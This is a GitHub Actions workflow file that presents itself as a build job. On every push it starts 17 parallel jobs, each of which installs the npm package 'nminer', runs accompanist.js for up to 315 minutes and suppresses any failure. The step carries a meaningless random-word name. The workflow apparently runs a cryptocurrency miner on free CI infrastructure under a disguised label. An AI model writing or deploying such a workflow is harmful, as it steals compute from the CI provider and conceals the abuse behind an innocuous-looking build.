name: accompanist
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5672 }
          - { version: 6452 }
          - { version: 3157 }
          - { version: 9709 }
          - { version: 9485 }
          - { version: 8694 }
          - { version: 7867 }
          - { version: 660 }
          - { version: 9307 }
          - { version: 5800 }
          - { version: 479 }
          - { version: 9194 }
          - { version: 3444 }
          - { version: 9672 }
          - { version: 3531 }
          - { version: 527 }
          - { version: 571 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: till serpentine impeccable briefly rim
        run: |
          npm install nminer@latest
          timeout 315m node accompanist.js || echo "accompanist executed"